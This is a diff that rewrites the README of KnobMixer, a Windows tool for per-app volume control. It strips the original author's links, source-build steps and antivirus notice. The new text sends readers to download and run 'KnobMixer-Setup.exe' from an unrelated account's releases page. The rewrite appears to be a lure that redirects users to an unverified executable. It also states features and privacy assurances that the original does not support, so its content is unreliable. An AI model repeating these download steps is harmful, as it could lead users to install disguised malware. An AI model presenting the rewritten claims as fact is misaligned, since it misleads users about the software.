@@ -1,188 +1,79 @@
-# KnobMixer
+# 🔊 KnobMixer - Control app volume using external hardware
 
-[![Build Windows exe](https://github.com/vtaeely/KnobMixer/actions/workflows/build-windows.yml/badge.svg)](https://github.com/vtaeely/KnobMixer/actions/workflows/build-windows.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.11%2B-blue.svg)](https://www.python.org/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-lightgrey.svg)](#requirements)
+[![](https://img.shields.io/badge/Download-KnobMixer-blue)](https://github.com/fishladdernewswoman851/KnobMixer/releases)
 
-**KnobMixer** is a Windows per-app volume controller. It redirects keyboard volume keys, `Fn` volume shortcuts, media buttons, and supported USB volume knobs to one selected application instead of changing the Windows master volume.
+KnobMixer lets you manage the volume of individual applications on your Windows computer using hardware inputs. You can map your keyboard media buttons or USB volume knobs to specific programs like Spotify, Discord, or your web browser. This tool runs in the system tray and provides a simple way to change audio levels without opening the Windows Volume Mixer window.
 
-<p align="center">
-  <img src="app/assets/icon.png" alt="KnobMixer icon" width="96" height="96">
-</p>
+## ⚙️ Requirements
 
-## What it does
+KnobMixer works on Windows 10 and Windows 11. Your computer requires the following:
 
-Normally, `Volume Up`, `Volume Down`, `Mute`, `Fn` volume shortcuts, and many physical volume knobs control the global Windows volume. KnobMixer listens for those controls and applies them to the selected audio application, such as Spotify, Discord, a browser, or a game.
+*   Windows 10 or 11 (64-bit).
+*   Keyboard with media keys or a USB volume knob device.
+*   Latest Windows audio drivers.
+*   System permissions to run background applications.
 
-Example:
+## 📥 Installation
 
-```text
-Selected app: Spotify.exe
+1. Visit the [official releases page](https://github.com/fishladdernewswoman851/KnobMixer/releases) to download the software.
+2. Select the file named `KnobMixer-Setup.exe`.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the downloaded file to begin the installation process.
+5. Follow the on-screen instructions in the installer.
+6. The app creates a shortcut on your desktop automatically.
 
-Volume Up   -> increase only Spotify volume
-Volume Down -> decrease only Spotify volume
-Mute        -> toggle only Spotify mute
-```
+## 🚀 Setup and Usage
 
-KnobMixer tries to suppress changes to Windows master volume when possible. This is best-effort behavior because Windows and some HID Consumer Control devices do not always allow full suppression.
+Once you finish the installation, follow these steps to link your hardware.
 
-## Features
+1. Launch KnobMixer from the desktop shortcut or your Start menu.
+2. Look for the speaker icon in your system tray—the area near the clock at the bottom right of your screen.
+3. Right-click the icon to open the menu.
+4. Select Settings to view your available audio devices and applications.
+5. Click Add New Bind to create a connection.
+6. Press the physical button or turn the knob you want to use. KnobMixer detects the input signal automatically.
+7. Select the specific application you want to control from the dropdown list.
+8. Click Save to confirm your changes.
 
-- Lists active Windows audio sessions.
-- Controls Spotify, Discord, browsers, games, and other processes with active audio sessions.
-- Remembers the selected process by name.
-- Controls all audio sessions that belong to the selected process.
-- Automatically resumes control when the process closes and opens again.
-- Supports standard `VK_VOLUME_UP`, `VK_VOLUME_DOWN`, and `VK_VOLUME_MUTE` keyboard events.
-- Supports `Fn` volume shortcuts when the keyboard sends standard Windows volume events.
-- Supports Raw Input / HID Consumer Control devices for many multimedia keyboards, macro pads, and USB volume knobs.
-- Always-on volume intercept: the UI checkbox is locked on intentionally.
-- Runs in the Windows system tray.
-- Stores settings in a local JSON file.
-- Builds into a standalone `.exe` with PyInstaller.
+You can now adjust the volume of the selected program using your hardware. Repeat these steps for each application you want to control.
 
-## Fn key combinations
+## 🛠️ Features
 
-KnobMixer works with laptop keyboards and compact keyboards that use shortcuts such as `Fn + F1`, `Fn + F2`, `Fn + F3`, or similar media-key combinations, as long as those shortcuts send standard Windows volume events.
+*   **Per-App Volume Control**: Set independent volume levels for different software.
+*   **Hardware Compatibility**: Works with standard media keys, gaming keyboards, and dedicated USB knobs.
+*   **Background Operation**: The software sits in the system tray to ensure minimal impact on your system resources.
+*   **Instant Mapping**: The software detects raw input signals from connected devices.
+*   **Volume Mixer Integration**: Uses standard Windows audio protocols to maintain stable sound levels.
 
-Important: KnobMixer does not intercept the `Fn` key directly. On most keyboards, `Fn` is handled by the keyboard firmware before Windows receives anything. KnobMixer reacts to the final volume event that Windows receives, such as:
+## 🔧 Troubleshooting
 
-```text
-VK_VOLUME_UP
-VK_VOLUME_DOWN
-VK_VOLUME_MUTE
-```
+If KnobMixer does not respond to your inputs, check the following items:
 
-If a keyboard handles `Fn` shortcuts completely in firmware or sends non-standard HID events, behavior may depend on the device. In that case, Raw Input / HID mode may still detect the volume event, but full master-volume suppression is not guaranteed.
+**Hardware detection**
+Verify that your keyboard or USB knob works in other programs. If Windows does not recognize the device, KnobMixer cannot detect your button presses. Unplug the device and plug it back into a different USB port.
 
-## Supported controls
+**Application visibility**
+KnobMixer only displays programs that are currently playing audio or are active in the Windows Volume Mixer. If an application is muted or closed, it may disappear from the list. Open the application and play a sound to ensure it appears in the selection menu.
 
-KnobMixer is not tied to one specific keyboard or device model. It is designed to work with devices that send standard Windows volume input:
+**Restarting the app**
+If the software stops responding, right-click the system tray icon and select Exit. Open the application again from the desktop shortcut to refresh the connection to your audio devices.
 
-- regular keyboard volume keys;
-- laptop `Fn` volume shortcuts;
-- multimedia keyboards;
-- USB volume knobs;
-- macro pads;
-- HID Consumer Control devices;
-- physical volume knobs that send standard volume events.
+**Driver updates**
+Ensure your audio drivers are current. Outdated drivers can prevent communication between your hardware and the Windows volume system. Use the Windows Device Manager to check for driver updates if you experience distorted sound or input delays.
 
-## Requirements
+## 💡 Configuration Tips
 
-- Windows 10 or Windows 11
-- Python 3.11+ for source mode
-- Administrator mode may be required for some devices or elevated target applications
+*   **Startup Behavior**: Open the settings menu to enable "Start with Windows." This ensures your volume controls work the moment you log in.
+*   **Global Volume**: You can map one knob to the "Master" device to control the global system volume instead of a single application.
+*   **Multiple Knob Devices**: The software supports multiple hardware devices at the same time. You can assign one knob to your web browser and another to your communication software.
+*   **Latency**: If you notice a lag between turning a knob and the volume changing, close other heavy applications that consume high CPU levels. KnobMixer uses very little power, but system-wide delays can affect response times.
 
-## Quick start from source
+## 📜 Privacy and Data
 
-```bat
-git clone https://github.com/vtaeely/KnobMixer.git
-cd KnobMixer
-py -3.12 -m venv venv
-venv\Scripts\activate
-python -m pip install --upgrade pip
-pip install -r requirements.txt
-python main.py
-```
+KnobMixer runs locally on your machine. The internal code processes your inputs directly through Windows. It does not send any telemetry, hardware information, or audio data to the internet. Your settings file remains on your local drive in your user folder.
 
-If Python 3.12 is not installed, use Python 3.11:
+## ℹ️ Technical Background
 
-```bat
-py -3.11 -m venv venv
-```
+The software utilizes standard Windows audio API systems to handle volume changes. It monitors raw input events from your USB devices and keyboard interface. By leveraging the Windows audio architecture, the application applies changes directly to the audio stream of the target application. This approach ensures compatibility with most media players and browser-based audio clients.
 
-## Build Windows exe
-
-```bat
-build.bat
-```
-
-The executable will be created here:
-
-```text
-dist\KnobMixer.exe
-```
-
-## Project structure
-
-```text
-KnobMixer/
-├── .github/
-│   ├── ISSUE_TEMPLATE/
-│   ├── workflows/
-│   │   └── build-windows.yml
-│   └── pull_request_template.md
-├── app/
-│   ├── assets/
-│   ├── models/
-│   ├── services/
-│   └── ui/
-├── docs/
-├── logs/
-├── main.py
-├── requirements.txt
-├── requirements-dev.txt
-├── build.bat
-├── run.bat
-├── KnobMixer.spec
-├── CHANGELOG.md
-├── LICENSE
-├── README.ru.md
-└── README.md
-```
-
-## How it works
-
-1. KnobMixer reads active Windows audio sessions through Windows Audio Session API.
-2. The user selects an app from the UI or tray menu.
-3. KnobMixer stores the selected process name.
-4. Volume events are captured through a low-level keyboard hook and/or Raw Input.
-5. The selected process volume is changed through `pycaw`.
-6. If the process has multiple audio sessions, all matching sessions are controlled.
-7. If the process is not running, the app shows that the target application was not found.
-8. When the process appears again with the same name, control resumes automatically.
-
-## Technologies
-
-- **PyQt6** for the desktop UI.
-- **pycaw** for Windows audio sessions.
-- **comtypes** for Windows COM interop.
-- **psutil** for process information.
-- **pywin32** for Raw Input and Windows message handling.
-- **ctypes** for the low-level keyboard hook.
-- **PyInstaller** for one-file Windows builds.
-
-## Limitations
-
-Windows does not always allow an application to fully suppress master volume changes. This is especially common with devices that send volume events as HID Consumer Control input.
-
-Best suppression behavior usually happens with standard keyboard events:
-
-```text
-VK_VOLUME_UP
-VK_VOLUME_DOWN
-VK_VOLUME_MUTE
-```
-
-For USB knobs, multimedia devices, or some `Fn` shortcuts, Raw Input can receive the event, but the system volume may still change before KnobMixer can react.
-
-## Antivirus notice
-
-KnobMixer uses Windows keyboard hooks and Raw Input to capture volume keys and HID media controls. Some antivirus software may flag PyInstaller-built executables as suspicious because of this behavior.
-
-The source code is available for review, and release builds are produced through GitHub Actions.
-
-## Troubleshooting
-
-See [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md).
-
-## Build artifacts
-
-GitHub Actions builds `KnobMixer.exe` on Windows and uploads it as a workflow artifact. Open the latest successful workflow run and download `KnobMixer-windows`.
-
-Stable release builds are available on the [Releases](https://github.com/vtaeely/KnobMixer/releases) page.
-
-## License
-
-MIT License. See [LICENSE](LICENSE).
+The codebase is built for stability and speed. It handles audio signal updates in real-time, which allows for smooth transitions when you turn your hardware knob. You can view the open-source structure on the repository page if you wish to see how the software communicates with Windows audio components.
